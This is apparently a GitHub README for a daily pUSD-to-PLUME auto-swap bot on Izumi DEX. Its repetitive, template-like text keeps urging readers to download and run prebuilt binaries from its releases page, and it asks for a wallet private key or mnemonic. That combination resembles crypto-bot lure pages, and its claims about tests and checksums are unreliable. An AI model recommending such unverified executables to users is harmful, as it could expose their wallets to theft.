https://github.com/HungChoo/Autoswap-plumeV2/releases

# Autoswap-plumeV2: Daily Izumi DEX pUSD to PLUME Auto Swap Portal

![Portal banner](https://picsum.photos/1200/300)

[![Releases](https://img.shields.io/badge/Releases-View%20Latest-blue?style=for-the-badge&logo=github)](https://github.com/HungChoo/Autoswap-plumeV2/releases)
[![Repo](https://img.shields.io/badge/Repo-Autoswap-plumeV2-blueviolet?style=for-the-badge&logo=github)](https://github.com/HungChoo/Autoswap-plumeV2)

Introduction
- This project automates a daily swap on Izumi DEX. It moves pUSD into PLUME through the Plume Portal.
- It targets a smooth, predictable daily action. It keeps swaps aligned with a fixed window, minimal slippage, and clear logs.
- The design emphasizes reliability, transparent operations, and straightforward setup. You control the wallet and the swap policy.

Overview of the workflow
- The bot watches a price reference and liquidity conditions.
- At a defined daily time, it submits a swap from pUSD to PLUME on Izumi DEX via the Plume Portal.
- It records the outcome in logs, and it stores a concise report for auditing.
- The system supports retries in case of temporary network hiccups.

What this README covers
- How to install, configure, and run Autoswap-plumeV2
- How the swap flow works with Izumi DEX and the Plume Portal
- How to customize the daily swap window, amount, and slippage
- How to test, monitor, and troubleshoot
- How to contribute and extend

Key concepts and terminology
- Izumi DEX: A decentralized exchange on the chain you target. It provides liquidity pools and swap routes.
- Plume Portal: The interface or gateway that enables automated routing of pUSD to PLUME for this project.
- pUSD: A stablecoin used as the input asset for daily swaps.
- PLUME: The target asset of the swap.
- Daily swap window: A defined time range when the swap is executed, minimizing price impact and drift.
- Asset addresses: The on-chain addresses for pUSD and PLUME tokens used by the bot.

Table of contents
- Quick start
- Project structure
- How it works
- Prerequisites
- Installation
- Configuration
- Usage
- Advanced usage
- Security and best practices
- Testing and validation
- Environment and dependencies
- Deployment and operations
- Release policy and assets
- Contributing
- Roadmap
- FAQ
- License

Quick start
- The Releases page contains prebuilt binaries for common platforms. Since the link has a path, you should download the appropriate asset from the releases and run it.
- To get started quickly, obtain the latest release asset and run it on your machine. The asset is designed to be self-contained and executable on your platform.
- The releases page is the source of truth for builds, checksums, and instructions. View it at the link below and pick the asset that matches your OS.

From the releases page, download the latest asset
- The file to download from the releases page is named autoswap-plumeV2-<platform>.<extension>, for example autoswap-plumeV2-linux-x86_64.AppImage.
- After downloading, make the file executable and run it. For Linux AppImage: chmod +x autoswap-plumeV2-linux-x86_64.AppImage and then ./autoswap-plumeV2-linux-x86_64.AppImage
- For Windows: autoswap-plumeV2-windows-x86_64.zip, extract it, and run the executable inside
- For macOS: autoswap-plumeV2-darwin-x86_64.pkg or a similar installer; follow the on-screen prompts

Learn by exploring
- Review the releases notes to understand the changes, bug fixes, and new features
- Check the asset checksums to verify integrity
- Read the changelog in the repo to see historical context

Project structure
- bin/ - Executable artifacts for different platforms (AppImage, Windows binary, etc.)
- src/ - Core logic for price monitoring, timing, and swap submission
- examples/ - Sample configuration files and usage scenarios
- tests/ - Unit and integration tests
- docs/ - Supplemental documentation and developer notes
- tools/ - Helpers for development, linting, and release automation
- config/ - Default configuration templates and environment variable mappings
- scripts/ - Convenience scripts for deployment and maintenance
- assets/ - Token addresses, routers, and exchange references used by the bot

How it works
- The bot runs in a controlled loop, checking the day’s schedule and validation conditions.
- It uses a wallet key to authorize transactions on the chain.
- It queries the Izumi DEX interface to determine the swap route and price impact.
- It submits a swap order to convert pUSD to PLUME using the Plume Portal.
- It records the outcome, including gas usage, price impact, and effective price.
- It handles errors gracefully and retries within the configured limits.

Prerequisites
- A supported operating system: Linux, Windows, or macOS
- Node.js 18+ or the runtime included with the release asset (depending on platform)
- A wallet with enough pUSD to perform the daily swap
- An RPC endpoint with read and write permissions for the chain you use
- A stable internet connection with required ports open

Installation
- Start with a clean workspace
- Clone the repository locally (optional if you use a release bundle)
- Install dependencies if you build from source
- If you download a release asset, follow the platform-specific run instructions

- Example commands for a source build (if you prefer building):
  - git clone https://github.com/HungChoo/Autoswap-plumeV2.git
  - cd Autoswap-plumeV2
  - npm install
  - cp .env.example .env
  - Edit .env to configure keys, endpoints, and preferences
  - npm run start

- Example for a release asset:
  - Download the appropriate asset from the releases page
  - Mark the file executable if needed
  - Run the binary or installer as described in the asset’s instructions

Configuration and environment variables
- Wallet configuration
  - PRIVATE_KEY or MNEMONIC: The private key or mnemonic for the wallet that will execute swaps
  - Use a dedicated wallet for automation, separate from personal funds
- Network and RPC
  - RPC_URL: The RPC endpoint for the blockchain you use
  - CHAIN_ID: The chain identifier for the target network
- Token references
  - PUSD_ADDRESS: The contract address for pUSD on the target chain
  - PLUME_ADDRESS: The contract address for PLUME on the target chain
  - IZUMI_ROUTER_ADDRESS: Address for the Izumi DEX router on the target network
- Swap logic
  - DAILY_SWAP_TIME: Local time window when the swap should execute
  - SLIPPAGE_TOLERANCE: Acceptable slippage percentage for the swap
  - DAILY_SWAP_AMOUNT_PUSD: The amount of pUSD to swap daily
  - MAX_PLUME_OUT_PER_SWAP: Limit on the PLUME you accept per swap
- Logging and monitoring
  - LOG_LEVEL: debug, info, warn, error
  - LOG_OUTPUT: file path or stdout
  - NOTIFY_WEBHOOK_URL: Optional: a webhook for alerts
- Security and access
  - ENCRYPTED_KEYS: If you store keys, ensure encryption at rest
  - ACCESS_CONTROL: IP whitelisting or role-based access controls for management

Usage
- Quick run
  - Ensure .env is configured
  - Run the binary or script provided by the release asset
  - The bot will start, log its actions, and wait for the daily window
- Daily schedule
  - The bot uses a time window to determine when to submit its swap
  - It accounts for network latency and price volatility
  - It logs the exact timestamp, price, and the resulting transaction hash
- Monitoring
  - Check logs for swap status
  - Look for a successful transaction hash and confirmation
  - If a retry occurs, the log will indicate the retry count and reason
- Logs and reports
  - The logs contain: timestamp, action, gas used, price impact, and execution status
  - A daily summary is generated and can be forwarded to your monitoring system

Advanced usage
- Custom routing and strategies
  - Integrate alternative routers or routes if Izumi DEX supports multiple paths
  - Adjust the swap logic to prefer lower slippage or faster execution
- Operating in test mode
  - Use a testnet RPC URL and test assets to validate logic without risk
  - Enable a dry-run mode to simulate swaps and validate outcomes
- Scheduling options
  - Use a cron-like expression to set flexible windows
  - Tie the schedule to external triggers or calendars
- Notifications
  - Extend notifications to email, Slack, Discord, or a custom webhook
  - Attach per-swap metadata for audit trails
- Metrics and telemetry
  - Emit metrics to a time-series store to track performance over time
  - Collect data on price impact, liquidity depth, and failed attempts

Security and best practices
- Use a dedicated automation wallet
- Rotate keys regularly and store keys in a secure vault
- Run the bot on a trusted machine with up-to-date software
- Keep the release asset up to date by reviewing the latest release notes
- Do not expose private keys in logs or publicly accessible files
- Validate the integrity of release assets via checksums

Testing and validation
- Unit tests cover price estimation, path selection, and transaction construction
- Integration tests simulate full swap flows using a test RPC
- End-to-end tests verify scheduling, retries, and reporting
- Manual checks involve running the bot in a test environment and watching the logs
- Regression tests ensure changes do not break existing behavior

Environment and dependencies
- Runtime environment that matches the target platform
- Dependency libraries for blockchain interaction, signing, and network requests
- A local or remote RPC endpoint with sufficient permissions
- A stable time source for accurate daily scheduling

Deployment and operations
- Continuous deployment workflow can publish new release assets
- Rollback plan: if a new release introduces issues, revert to the previous release
- Backups: keep a secure copy of wallet configurations and important logs
- Observability: ensure log rotation and log retention meet your needs
- Security patches: apply critical security updates promptly

Release policy and assets
- The releases page hosts all binary assets and release notes
- Each release includes checksums for integrity verification
- Choose the asset that matches your platform
- After download, verify the checksum before execution
- The classic workflow: download, verify, install, run

From the releases page you can download the assets
- The file named autoswap-plumeV2-linux-x86_64.AppImage is the Linux executable
- The Windows asset autoswap-plumeV2-windows-x86_64.zip contains a zipped binary
- The macOS asset autoswap-plumeV2-darwin-x86_64.pkg is a package installer
- For all assets, follow the platform-specific execution steps provided in the asset package
- The releases page contains details about supported platforms, build versions, and known issues
- Use the release notes to understand the changes for each version

Contributing
- Follow the project’s contributing guidelines to propose features or fix issues
- Submit a GitHub issue to discuss new ideas or report bugs
- Open a pull request with clear description, tests, and documentation
- Add tests for your changes and run the test suite locally
- Document new configuration options or behavioral changes

Roadmap
- Improve routing strategies for price optimization
- Add support for additional DEXes beyond Izumi
- Enhance monitoring with richer metrics and dashboards
- Expand language support for configuration and logging

FAQ
- How often does the daily swap run?
  It runs once per configured daily window unless retries occur
- Can I customize the daily window?
  Yes, set DAILY_SWAP_TIME and related scheduling parameters
- Is private key security handled by the bot?
  The bot requires access to the private key through a secure mechanism; do not store it in plain text
- What happens if the swap fails?
  The bot retries within configured limits and logs the failure with details

Changelog
- 2.0.0: Major update for daily Izumi DEX swap with Plume Portal integration
- 1.9.2: Minor fixes to logging and error handling
- 1.9.0: Refactor to improve reliability and add test coverage
- 1.8.5: Security hardening and environment variable validation
- 1.8.0: Added support for Windows platform
- 1.7.0: Introduced daily swap window and slippage controls

License
- This project uses a permissive license. See LICENSE for details.

Credits
- Thanks to the community for feedback and testing
- Special thanks to maintainers and contributors who aided in architecture, design, and testing

Releases and assets
- To get the latest binaries, visit the releases page at the link provided earlier
- The asset lists include platform-specific installers and executables
- The link to the releases page is essential for obtaining the correct file for your environment
- For convenience, the releases page also hosts asset checksums that help you confirm file integrity

Downloads from the releases page
- Download the appropriate asset for your platform from the releases page
- The asset names follow a consistent pattern: autoswap-plumeV2-<platform>.<extension>
- After you download, follow the platform-specific steps to install or run
- Example workflows are included in the asset’s readme and release notes

Using the link again for clarity
- Access the official release assets here: https://github.com/HungChoo/Autoswap-plumeV2/releases
- This page aggregates builds, notes, and checksums, and it is the source of truth for distribution

Appendix: sample configuration files (snippets)
- .env.example (describes all required variables, with comments)
- config/defaults.yaml (provides default values and examples of usage)
- scripts/validate-config.sh (quick validation of environment variables)

Note on platform-specific steps
- Linux
  - AppImage is designed to run without installation but may require executable permission
  - Use chmod +x and run directly from the terminal
- Windows
  - Use the provided ZIP bundle; extract and run the executable
  - Ensure your environment allows executable code from trusted sources
- macOS
  - The PKG installer provides a guided setup
  - Confirm the developer certificate prompts during installation

Final reminders
- Always verify the integrity of release assets before running
- Use a dedicated automation wallet and rotate keys periodically
- Monitor logs to detect anomalies and adjust the configuration as needed
- Keep the bot up to date with the latest release for security and reliability
- Review the Releases page to understand the asset names and their compatibility

End of document for reference use
- You can browse the Releases page to review changes and to download assets at any time
- The link provided above is essential for obtaining the correct binaries and updates